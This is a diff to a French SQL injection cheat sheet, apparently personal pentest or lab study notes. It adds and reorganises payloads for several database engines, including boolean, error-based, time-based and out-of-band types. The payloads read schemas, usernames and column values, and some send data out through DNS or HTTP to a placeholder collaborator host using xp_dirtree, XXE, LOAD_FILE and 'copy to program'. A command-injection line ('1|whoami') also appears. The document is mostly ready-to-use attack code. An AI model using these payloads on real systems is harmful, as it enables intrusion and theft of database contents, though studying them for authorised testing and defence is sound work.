@@ -30,6 +30,10 @@ Tous les placeholders s'écrivent en majuscules entre chevrons. Ils sont à remp
 | `<MARQUEUR>` | Texte unique facile à repérer dans la réponse | Chaîne aléatoire |
 | `<MOTCLE>` et `<ANNEE>` | Mot et année de la politique de mot de passe | Valeurs plausibles pour la cible |
 | `<DELAI>` | Durée du délai en secondes | 10 par défaut |
+| `<POS>` | Position de début d'une tranche de texte | Entier : 1, 32, 63, 94 pour des tranches de 31 caractères |
+| `<NOM_EN_HEXADECIMAL>` | Nom de table écrit en hexadécimal, sans apostrophe | Nom de la table converti en hexadécimal, sans le préfixe `0x` |
+| `<TABLE_EN_MAJUSCULES>` | Nom de table Oracle | Nom de la table en majuscules |
+| `<COL1>` et `<COL2>` | Colonnes déjà lues | Noms des colonnes à exclure de la requête suivante |
 
 Autres conventions :
 - Payload position Intruder : `§X§` garde le format exact de Burp, par exemple `§a§`.
@@ -157,7 +161,7 @@ Note détaillée : [[SQL-injection]] ; fiches : [[SQL-injection-Union-Attacks]],
 <VALEUR>'-- -
 -- SQL-C2 condition toujours vraie
 ' OR 1=1-- -
--- SQL-C3 contournement connexion utilisateur
+-- SQL-C3 bypass connexion utilisateur
 <UTILISATEUR>'-- -
 ```
 
@@ -348,53 +352,53 @@ Le point d'injection peut se trouver dans le corps de la requête, un cookie ou 
 **Tous moteurs**
 
 ```sql
--- SQL-B1 booleen vrai
+-- SQL-B1 boolean vrai
 <VALEUR>' AND '1'='1
--- SQL-B1 booleen faux
+-- SQL-B1 boolean faux
 <VALEUR>' AND '1'='2
--- SQL-B2 booleen numerique vrai
+-- SQL-B2 boolean numerique vrai
 <VALEUR> AND 1=1
--- SQL-B2 booleen numerique faux
+-- SQL-B2 boolean numerique faux
 <VALEUR> AND 1=2
--- SQL-B3 booleen existence table
+-- SQL-B3 boolean existence table
 <VALEUR>' AND (SELECT 'a' FROM <TABLE> LIMIT 1)='a
--- SQL-B3 booleen existence utilisateur
+-- SQL-B3 boolean existence utilisateur
 <VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>')='a
 ```
 
 **PostgreSQL et MySQL**
 
 ```sql
--- SQL-B4 booleen longueur
+-- SQL-B4 boolean longueur
 <VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>' AND LENGTH(<COLONNE>)><N>)='a
--- SQL-B5 booleen caractere intruder
+-- SQL-B5 boolean caractere intruder
 <VALEUR>' AND (SELECT SUBSTRING(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='§a§
--- SQL-B6 booleen dichotomie
+-- SQL-B6 boolean dichotomie
 <VALEUR>' AND ASCII(SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1))>109-- -
--- SQL-B8 booleen existence colonne postgresql
+-- SQL-B8 boolean existence colonne postgresql
 <VALEUR>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='<TABLE>' AND column_name='<COLONNE>')=1-- -
 ```
 
 **Oracle**
 
 ```sql
--- SQL-B5 booleen caractere oracle
+-- SQL-B5 boolean caractere oracle
 <VALEUR>' AND (SELECT SUBSTR(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='a' AND '1'='1
 ```
 
 **Microsoft SQL Server**
 
 ```sql
--- SQL-B4 booleen longueur microsoft
+-- SQL-B4 boolean longueur microsoft
 <VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>' AND LEN(<COLONNE>)><N>)='a
--- SQL-B5 booleen caractere microsoft
+-- SQL-B5 boolean caractere microsoft
 <VALEUR>' AND (SELECT SUBSTRING(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='a'-- -
 ```
 
 **MySQL et MariaDB**
 
 ```sql
--- SQL-B7 booleen casse mysql
+-- SQL-B7 boolean casse mysql
 <VALEUR>' AND BINARY SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1)='A'-- -
 ```
 
@@ -417,20 +421,42 @@ Pour automatiser, voir [[#Outils Burp - Intruder]] : une position pour l'index e
 | SQL-E9 | MySQL et MariaDB, équivalent de SQL-E5 | Même message que SQL-E5 | Utile si EXTRACTVALUE est filtré |
 | SQL-E10 | MySQL, double requête | Message `Duplicate entry` avec la valeur | Dépend de la version, plutôt pour d'anciennes versions |
 | SQL-E11 | MySQL, conditional error | Message `Subquery returns more than 1 row` si la condition est vraie | La division par zéro ne lève pas d'erreur en lecture sur MySQL |
-| SQL-E12 | Microsoft, version et utilisateur | Message de conversion avec la valeur | Même mécanisme que SQL-E6 |
-| SQL-E13 | Microsoft, plusieurs lignes | Message de conversion avec la liste | STRING_AGG demande SQL Server 2017 ou plus ; FOR XML PATH pour les versions plus anciennes |
+| SQL-E12 | Microsoft, version, utilisateur et base courante | Message de conversion avec la valeur | Même mécanisme que SQL-E6 |
+| SQL-E13 | Microsoft, plusieurs lignes | Message de conversion avec la liste | STRING_AGG demande SQL Server 2017 ou plus ; pour les versions plus anciennes, FOR XML PATH avec une conversion intermédiaire en varchar(max), faute de quoi la valeur n'est pas citée ; les caractères spéciaux sortent en entités XML |
 | SQL-E14 | Oracle, UTL_INADDR | Message `ORA-29257: host` suivi de la valeur | Dépend de la version et des droits réseau |
 | SQL-E15 | Oracle, CTXSYS | Message `ORA-20000` avec la valeur | Exige Oracle Text |
 | SQL-E16 | SQLite, conditional error | Message `integer overflow` si la condition est vraie | Conditional error uniquement, aucune fuite de valeur ; dépend de la version |
-| SQL-E17 | PostgreSQL, plusieurs lignes | Message de conversion avec la liste | Message souvent tronqué ; préférer LIMIT 1 OFFSET |
+| SQL-E17 | PostgreSQL, plusieurs lignes | Message de conversion avec la liste | Message souvent tronqué ; préférer la ligne de rang N (SQL-E27) |
 | SQL-E18 | PostgreSQL, reconnaissance du contexte | Message `argument of AND must be type boolean` | Confirme PostgreSQL |
-| SQL-E19 | PostgreSQL, conditional error par conversion | Erreur de conversion si la condition est vraie | Alternative à SQL-E3 |
-| SQL-E20 | MySQL, conditional error par sous-requête | Erreur `more than 1 row` si la condition est vraie | Alternative à SQL-E11 |
+| SQL-E19 | PostgreSQL, conditional error par conversion | Erreur de conversion si la condition est vraie | Alternative à SQL-E3 ; la sous-requête empêche l'évaluation à l'avance, sans elle l'erreur survient dans tous les cas |
+| SQL-E20 | MySQL, conditional error par CASE et UNION | Erreur `more than 1 row` si la condition est vraie | Variante de SQL-E11 sans table de référence ; les deux se lisent ensemble |
 | SQL-E21 | Microsoft, CAST | Message de conversion avec la valeur | Équivalent de SQL-E6 |
 | SQL-E22 | Microsoft, erreurs de regroupement | Noms de la forme table.colonne, un par requête | Anciennes versions |
 | SQL-E23 | Microsoft, conditional error avec stacked queries | Erreur si la condition est vraie | Exige les stacked queries ; point-virgule en `%3b` dans un cookie |
 | SQL-E24 | Oracle, XMLTYPE simplifié | Message ORA-31011 avec la valeur | Version plus courte de SQL-E7 |
 | SQL-E25 | SQLite, oracle JSON | Message `malformed JSON` si la condition est vraie | Extension JSON1 nécessaire |
+| SQL-E26 | PostgreSQL, verbose error avec garde de préfixe | Message de conversion avec la valeur précédée d'un tilde | Pour une donnée qui ressemble à un nombre ; une valeur NULL ne donne pas d'erreur, utiliser COALESCE |
+| SQL-E27 | PostgreSQL, ligne de rang N | Même message que SQL-E4, une ligne par requête | `<N>` commence à 0 ; sans ORDER BY l'ordre n'est pas garanti |
+| SQL-E28 | PostgreSQL, noms de tables | Nom de table cité dans le message | Lecture de information_schema nécessaire ; schéma public en général, sinon retirer le filtre |
+| SQL-E29 | PostgreSQL, noms de colonnes | Nom de colonne cité dans le message | Mêmes conditions que SQL-E28 |
+| SQL-E30 | PostgreSQL, version, utilisateur et base courante | Message de conversion avec la valeur | Preuve de concept sans lire de données applicatives |
+| SQL-E31 | PostgreSQL, conditional error par sous-requête multi-lignes | Message `more than one row returned by a subquery` si la condition est vraie | Alternative à SQL-E3 sans division ni conversion |
+| SQL-E32 | PostgreSQL, conditional error en forme par concaténation | Erreur de division par zéro si la condition est vraie | Valeur lue par la requête d'origine, par exemple un cookie ; aucun commentaire final |
+| SQL-E33 | MySQL, verbose error par GTID_SUBSET | Message `Malformed GTID set specification` avec la valeur | MySQL 5.6 et suivants, absent de MariaDB ; utile si SQL-E5 et SQL-E9 sont filtrés ou trop courts |
+| SQL-E34 | MySQL, verbose error par EXP | Message `DOUBLE value is out of range` avec la valeur dans le texte | MySQL 5.5.5 et suivants, surtout la série 5 ; en secours, non adapté à MariaDB |
+| SQL-E35 | MySQL et MariaDB, version, utilisateur et base courante | Message `XPATH syntax error` avec la valeur | Preuve de concept ; la fenêtre de 32 caractères suffit pour la version |
+| SQL-E36 | MySQL et MariaDB, tables, colonnes et agrégation tranchée | Nom de table ou de colonne cité après le tilde, puis tranche de 31 caractères | `LIMIT <N>,1` pour le rang N ; nom de table en hexadécimal pour éviter l'apostrophe ; GROUP_CONCAT borné par group_concat_max_len |
+| SQL-E37 | Oracle, ligne de rang N | Même message que SQL-E7 | Sous-requête à insérer dans SQL-E7 ou SQL-E24 ; la forme FETCH demande Oracle 12c |
+| SQL-E38 | Oracle, plusieurs lignes avec LISTAGG | Liste complète dans le message | Chaîne limitée à 4000 octets ; message tronqué |
+| SQL-E39 | Oracle, version, tables et colonnes | Valeur citée dans le message | Sous-requête à insérer dans SQL-E7 ou SQL-E24 ; noms d'objets en majuscules |
+| SQL-E40 | Oracle, conditional error en forme AND | Erreur de division par zéro (ORA-01476) si la condition est vraie | Quand la concaténation est impossible ; en contexte numérique, retirer l'apostrophe initiale |
+| SQL-E41 | Oracle, conditional error par TO_NUMBER | Message `ORA-01722: invalid number` si la condition est vraie | Alternative à SQL-E1 si la division est filtrée ; ne cite jamais la valeur |
+| SQL-E42 | Oracle, conditional error par sous-requête multi-lignes | Message `ORA-01427` si la condition est vraie | Alternative à SQL-E1 sans division |
+| SQL-E43 | Microsoft, tables une par une | Nom de table cité dans le message | Forme NOT IN, ou OFFSET FETCH avec ORDER BY obligatoire (SQL Server 2012 et suivants) |
+| SQL-E44 | Microsoft, colonnes une par une | Nom de colonne cité dans le message | La liste d'exclusion reprend les colonnes déjà lues |
+| SQL-E45 | Microsoft, verbose error avec garde de préfixe | Message de conversion avec la valeur précédée d'un tilde | Pour une donnée qui ressemble à un nombre ; une valeur NULL ne donne pas d'erreur, utiliser ISNULL ; plus en `%2b` |
+| SQL-E46 | Microsoft, conditional error par conversion | Message `Conversion failed when converting the varchar value` si la condition est vraie | Alternative à SQL-E2 si la division est filtrée |
+| SQL-E47 | Microsoft, conditional error en forme par concaténation | Erreur de division par zéro si la condition est vraie | Valeur de cookie, aucun commentaire final ; plus en `%2b` |
 
 Reconnaissance du moteur par le message d'erreur :
 
@@ -444,88 +470,190 @@ Reconnaissance du moteur par le message d'erreur :
 
 Pour l'extraction, remplacer `<COND>` par une comparaison de caractères, par exemple `SUBSTR(<COLONNE>,1,1)='a'`, et ajouter `FROM <TABLE> WHERE username='<UTILISATEUR>'` dans la sous-requête. Pour la longueur, utiliser `LENGTH(<COLONNE>)><N>`.
 
-**Oracle**
+Les blocs sont rangés par catégorie, verbose errors d'abord, puis conditional errors, et dans chaque catégorie par moteur. Le choix entre la forme `AND` et la forme par concaténation, ainsi que les contraintes d'extraction (une ligne à la fois, message tronqué), sont décrits dans [[Error-based SQL Injection]].
 
-```sql
--- SQL-E1 error-based oracle conditionnel
-' || (SELECT CASE WHEN (<COND>) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
--- SQL-E7 error-based oracle verbeux xmltype
-' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' AND ROWNUM=1)||CHR(62))) FROM dual)-- -
--- SQL-E24 error-based oracle xmltype simple
-' || (SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual) || '
--- SQL-E14 error-based oracle utl_inaddr
-' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
--- SQL-E15 error-based oracle ctxsys
-' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
-```
-
-**Microsoft SQL Server**
-
-```sql
--- SQL-E2 error-based microsoft conditionnel
-' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END)-- -
--- SQL-E6 error-based microsoft verbeux convert
-' AND 1=CONVERT(int,(SELECT TOP 1 <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'))-- -
--- SQL-E12 error-based microsoft version
-' AND 1=CONVERT(int,@@version)-- -
--- SQL-E12 error-based microsoft utilisateur
-' AND 1=CONVERT(int,SYSTEM_USER)-- -
--- SQL-E13 error-based microsoft string_agg
-' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -
--- SQL-E13 error-based microsoft for xml path
-' AND 1=CONVERT(int,(SELECT name+',' FROM sys.tables FOR XML PATH('')))-- -
--- SQL-E21 error-based microsoft cast
-' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- -
--- SQL-E22 error-based microsoft regroupement
-' HAVING 1=1-- -
--- SQL-E22 error-based microsoft regroupement
-' GROUP BY <COLONNE> HAVING 1=1-- -
--- SQL-E23 error-based microsoft empile conditionnel
-'; IF (<COND>) SELECT 1/0-- -
-```
+#### Verbose errors
 
 **PostgreSQL**
 
 ```sql
--- SQL-E3 error-based postgresql conditionnel
-' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/(SELECT 0) ELSE 1 END)-- -
--- SQL-E4 error-based postgresql verbeux cast
-' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -
--- SQL-E8 error-based postgresql verbeux operateur
-' AND 1=(SELECT <COLONNE> FROM <TABLE> LIMIT 1)::int-- -
--- SQL-E17 error-based postgresql string_agg
-' AND 1=CAST((SELECT string_agg(<COLONNE>,',') FROM <TABLE>) AS int)-- -
--- SQL-E18 error-based postgresql contexte
+-- SQL-E18 error-based postgresql verbose context
 ' AND CAST((SELECT 1) AS int)-- -
--- SQL-E19 error-based postgresql conditionnel conversion
-' AND 1=(SELECT CASE WHEN (<COND>) THEN CAST('a' AS int) ELSE 1 END)-- -
+-- SQL-E4 error-based postgresql verbose cast
+' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -
+-- SQL-E8 error-based postgresql verbose operateur
+' AND 1=(SELECT <COLONNE> FROM <TABLE> LIMIT 1)::int-- -
+-- SQL-E26 error-based postgresql verbose prefix guard
+' AND 1=CAST(CHR(126)||(SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -
+-- SQL-E27 error-based postgresql verbose row N
+' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> ORDER BY 1 LIMIT 1 OFFSET <N>) AS int)-- -
+-- SQL-E17 error-based postgresql verbose string_agg
+' AND 1=CAST((SELECT string_agg(<COLONNE>,',') FROM <TABLE>) AS int)-- -
+-- SQL-E28 error-based postgresql verbose schema tables
+' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET <N>) AS int)-- -
+-- SQL-E29 error-based postgresql verbose schema colonnes
+' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE>' LIMIT 1 OFFSET <N>) AS int)-- -
+-- SQL-E30 error-based postgresql verbose version
+' AND 1=CAST(version() AS int)-- -
+-- SQL-E30 error-based postgresql verbose utilisateur
+' AND 1=CAST(current_user AS int)-- -
+-- SQL-E30 error-based postgresql verbose base courante
+' AND 1=CAST(current_database() AS int)-- -
 ```
 
 **MySQL et MariaDB**
 
 ```sql
--- SQL-E5 error-based mysql verbeux extractvalue
+-- SQL-E5 error-based mysql verbose extractvalue
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)))-- -
--- SQL-E9 error-based mysql verbeux updatexml
+-- SQL-E9 error-based mysql verbose updatexml
 ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)),1)-- -
--- SQL-E10 error-based mysql double requete
+-- SQL-E10 error-based mysql verbose double requete
 ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -
--- SQL-E11 error-based mysql conditionnel
-' AND IF(<COND>,(SELECT table_name FROM information_schema.tables),'a')-- -
--- SQL-E20 error-based mysql conditionnel union
-' AND (SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- -
+-- SQL-E33 error-based mysql verbose gtid_subset
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1),0x7e),1)-- -
+-- SQL-E34 error-based mysql verbose exp
+' AND EXP(~(SELECT * FROM (SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1) x))-- -
+-- SQL-E35 error-based mysql verbose version
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -
+-- SQL-E35 error-based mysql verbose utilisateur
+' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))-- -
+-- SQL-E35 error-based mysql verbose base courante
+' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -
+-- SQL-E36 error-based mysql verbose schema tables row N
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <N>,1)))-- -
+-- SQL-E36 error-based mysql verbose schema colonnes row N
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=0x<NOM_EN_HEXADECIMAL> LIMIT <N>,1)))-- -
+-- SQL-E36 error-based mysql verbose group_concat tranche
+' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(<COLONNE>) FROM <TABLE>),<POS>,31)))-- -
 ```
 
 Le message de SQL-E10 a la forme `Duplicate entry '<valeur>~1' for key 'group_key'`.
 
+**Oracle**
+
+```sql
+-- SQL-E7 error-based oracle verbose xmltype
+' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' AND ROWNUM=1)||CHR(62))) FROM dual)-- -
+-- SQL-E24 error-based oracle verbose xmltype concatenation
+'||(SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual)||'
+-- SQL-E14 error-based oracle verbose utl_inaddr
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
+-- SQL-E15 error-based oracle verbose ctxsys
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
+-- SQL-E37 error-based oracle verbose row N rownum
+(SELECT <COLONNE> FROM (SELECT <COLONNE>, ROWNUM r FROM <TABLE>) WHERE r=<N>)
+-- SQL-E37 error-based oracle verbose row N fetch 12c
+(SELECT <COLONNE> FROM <TABLE> OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY)
+-- SQL-E38 error-based oracle verbose listagg
+(SELECT LISTAGG(<COLONNE>,',') WITHIN GROUP (ORDER BY <COLONNE>) FROM <TABLE>)
+-- SQL-E39 error-based oracle verbose version
+(SELECT banner FROM v$version WHERE ROWNUM=1)
+-- SQL-E39 error-based oracle verbose schema tables
+(SELECT table_name FROM all_tables WHERE ROWNUM=1)
+-- SQL-E39 error-based oracle verbose schema colonnes
+(SELECT column_name FROM all_tab_columns WHERE table_name='<TABLE_EN_MAJUSCULES>' AND ROWNUM=1)
+```
+
+Les lignes SQL-E37 à SQL-E39 sont des sous-requêtes : elles se placent à la place de la sous-requête interne de SQL-E7 ou de SQL-E24. Dans SQL-E7, `<N>` commence à 1 pour ROWNUM et à 0 pour FETCH.
+
+**Microsoft SQL Server**
+
+```sql
+-- SQL-E6 error-based microsoft verbose convert
+' AND 1=CONVERT(int,(SELECT TOP 1 <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'))-- -
+-- SQL-E21 error-based microsoft verbose cast
+' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- -
+-- SQL-E12 error-based microsoft verbose version
+' AND 1=CONVERT(int,@@version)-- -
+-- SQL-E12 error-based microsoft verbose utilisateur
+' AND 1=CONVERT(int,SYSTEM_USER)-- -
+-- SQL-E12 error-based microsoft verbose utilisateur de la base
+' AND 1=CONVERT(int,USER_NAME())-- -
+-- SQL-E12 error-based microsoft verbose base courante
+' AND 1=CONVERT(int,DB_NAME())-- -
+-- SQL-E12 error-based microsoft verbose nom du serveur
+' AND 1=CONVERT(int,@@servername)-- -
+-- SQL-E13 error-based microsoft verbose string_agg
+' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -
+-- SQL-E13 error-based microsoft verbose for xml path
+' AND 1=CONVERT(int,CONVERT(varchar(max),(SELECT name+',' FROM sys.tables FOR XML PATH(''))))-- -
+-- SQL-E43 error-based microsoft verbose tables row N not in
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN (SELECT TOP <N> name FROM sys.tables)))-- -
+-- SQL-E43 error-based microsoft verbose tables row N fetch 2012
+' AND 1=CONVERT(int,(SELECT name FROM sys.tables ORDER BY 1 OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY))-- -
+-- SQL-E44 error-based microsoft verbose schema colonnes
+' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='<TABLE>' AND column_name NOT IN ('<COL1>','<COL2>')))-- -
+-- SQL-E45 error-based microsoft verbose prefix guard
+' AND 1=CONVERT(int,'~'+(SELECT TOP 1 <COLONNE> FROM <TABLE>))-- -
+-- SQL-E22 error-based microsoft verbose regroupement
+' HAVING 1=1-- -
+-- SQL-E22 error-based microsoft verbose regroupement
+' GROUP BY <COLONNE> HAVING 1=1-- -
+```
+
+SQLite n'a pas de payload de verbose error sur les données : voir les conditional errors.
+
+#### Conditional errors
+
+**PostgreSQL**
+
+```sql
+-- SQL-E3 error-based postgresql conditional
+' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/(SELECT 0) ELSE 1 END)-- -
+-- SQL-E19 error-based postgresql conditional conversion
+' AND 1=(SELECT CASE WHEN (<COND>) THEN CAST((SELECT 'a') AS int) ELSE 1 END)-- -
+-- SQL-E31 error-based postgresql conditional multi-row
+' AND 1=(SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)-- -
+-- SQL-E32 error-based postgresql conditional concatenation
+'||(SELECT CASE WHEN (<COND>) THEN CAST(1/(SELECT 0) AS text) ELSE '' END)||'
+```
+
+**MySQL et MariaDB**
+
+```sql
+-- SQL-E11 error-based mysql conditional
+' AND IF(<COND>,(SELECT table_name FROM information_schema.tables),'a')-- -
+-- SQL-E20 error-based mysql conditional case union
+' AND (SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- -
+```
+
+**Oracle**
+
+```sql
+-- SQL-E1 error-based oracle conditional
+'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+-- SQL-E40 error-based oracle conditional and
+' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END FROM dual)-- -
+-- SQL-E41 error-based oracle conditional to_number
+'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(TO_NUMBER('a')) ELSE '' END FROM dual)||'
+-- SQL-E42 error-based oracle conditional multi-row
+'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR((SELECT 1 FROM dual UNION ALL SELECT 2 FROM dual)) ELSE '' END FROM dual)||'
+```
+
+**Microsoft SQL Server**
+
+```sql
+-- SQL-E2 error-based microsoft conditional
+' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END)-- -
+-- SQL-E23 error-based microsoft conditional stacked queries
+'; IF (<COND>) SELECT 1/0-- -
+-- SQL-E46 error-based microsoft conditional convert
+' AND 1=(SELECT CASE WHEN (<COND>) THEN CONVERT(int,'a') ELSE 1 END)-- -
+-- SQL-E47 error-based microsoft conditional concatenation
+'+(SELECT CASE WHEN (<COND>) THEN CAST(1/0 AS varchar) ELSE '' END)+'
+```
+
 **SQLite**
 
 ```sql
--- SQL-E16 error-based sqlite conditionnel
+-- SQL-E16 error-based sqlite conditional
 ' AND (SELECT CASE WHEN (<COND>) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -
--- SQL-E25 error-based sqlite json
+-- SQL-E25 error-based sqlite conditional json
 ' AND (SELECT CASE WHEN (<COND>) THEN json('{') ELSE 1 END)=1-- -
 ```
+
+La forme par concaténation avec `||` s'applique aussi à SQLite. En contexte numérique, retirer l'apostrophe initiale des formes `AND`.
 
 ### SQL injection - Time-based
 
@@ -539,42 +667,42 @@ Le message de SQL-E10 a la forme `Duplicate entry '<valeur>~1' for key 'group_ke
 **Oracle**
 
 ```sql
--- SQL-T1 delai oracle simple
+-- SQL-T1 time-based oracle simple
 '||dbms_pipe.receive_message(('a'),<DELAI>)-- -
--- SQL-T2 delai oracle conditionnel
+-- SQL-T2 time-based oracle conditional
 ' || (SELECT CASE WHEN (<COND>) THEN 'a'||dbms_pipe.receive_message(('a'),<DELAI>) ELSE NULL END FROM dual)-- -
 ```
 
 **Microsoft SQL Server**
 
 ```sql
--- SQL-T1 delai microsoft simple
+-- SQL-T1 time-based microsoft simple
 '; WAITFOR DELAY '0:0:<DELAI>'-- -
--- SQL-T2 delai microsoft conditionnel
+-- SQL-T2 time-based microsoft conditional
 '; IF (<COND>) WAITFOR DELAY '0:0:<DELAI>'-- -
--- SQL-T3 delai microsoft extraction
+-- SQL-T3 time-based microsoft extraction
 '; IF (SELECT COUNT(*) FROM <TABLE> WHERE username='<UTILISATEUR>' AND SUBSTRING(<COLONNE>,1,1)='a')=1 WAITFOR DELAY '0:0:<DELAI>'-- -
 ```
 
 **PostgreSQL**
 
 ```sql
--- SQL-T1 delai postgresql simple
+-- SQL-T1 time-based postgresql simple
 '||pg_sleep(<DELAI>)-- -
--- SQL-T2 delai postgresql conditionnel
+-- SQL-T2 time-based postgresql conditional
 '%3BSELECT CASE WHEN (<COND>) THEN pg_sleep(<DELAI>) ELSE pg_sleep(0) END-- -
--- SQL-T3 delai postgresql extraction
+-- SQL-T3 time-based postgresql extraction
 '%3BSELECT CASE WHEN (ASCII(SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1))>109) THEN pg_sleep(<DELAI>) ELSE pg_sleep(0) END-- -
 ```
 
 **MySQL et MariaDB**
 
 ```sql
--- SQL-T1 delai mysql simple
+-- SQL-T1 time-based mysql simple
 ' AND SLEEP(<DELAI>)-- -
--- SQL-T2 delai mysql conditionnel
+-- SQL-T2 time-based mysql conditional
 ' AND IF(<COND>,SLEEP(<DELAI>),0)-- -
--- SQL-T4 delai mysql benchmark
+-- SQL-T4 time-based mysql benchmark
 ' AND IF(<COND>,BENCHMARK(5000000,SHA1('a')),0)-- -
 ```
 
@@ -594,34 +722,34 @@ Pour relever les interactions, voir [[#Outils Burp - Collaborator]]. Dans un coo
 **Oracle**
 
 ```sql
--- SQL-O3 hors bande oracle utl_inaddr
+-- SQL-O3 out-of-band oracle utl_inaddr
 UTL_INADDR.get_host_address('<COLLAB>')
--- SQL-O5 hors bande oracle xml interaction
+-- SQL-O5 out-of-band oracle xml interaction
 x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB>/"> %remote;]>'),'/l') FROM dual-- -
--- SQL-O4 hors bande oracle exfiltration
+-- SQL-O4 out-of-band oracle exfiltration
 x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>')||'.<COLLAB>/"> %remote;]>'),'/l') FROM dual)||'
 ```
 
 **Microsoft SQL Server**
 
 ```sql
--- SQL-O1 hors bande microsoft xp_dirtree
+-- SQL-O1 out-of-band microsoft xp_dirtree
 '; exec master..xp_dirtree '//<COLLAB>/a'-- -
--- SQL-O4 hors bande microsoft exfiltration
+-- SQL-O4 out-of-band microsoft exfiltration
 '; DECLARE @p VARCHAR(99); SET @p=(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'); EXEC('master..xp_dirtree "//'+@p+'.<COLLAB>/a"')-- -
 ```
 
 **PostgreSQL**
 
 ```sql
--- SQL-O2 hors bande postgresql copy
+-- SQL-O2 out-of-band postgresql copy
 '; copy (SELECT '') to program 'nslookup <COLLAB>'-- -
 ```
 
 **MySQL et MariaDB**
 
 ```sql
--- SQL-O6 hors bande mysql load_file
+-- SQL-O6 out-of-band mysql load_file
 ' AND LOAD_FILE(CONCAT('\\\\',(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),'.<COLLAB>\\a'))-- -
 ```
 
@@ -701,7 +829,7 @@ Encodage utile dans une URL : `&` en `%26`, `;` en `%3b`, `|` en `%7c`, saut de 
 **Commun à Unix et Windows**
 
 ```text
-# CMD-1 injection simple sortie visible
+# CMD-1 command injection simple sortie visible
 1|whoami
 # CMD-2 detection marqueur
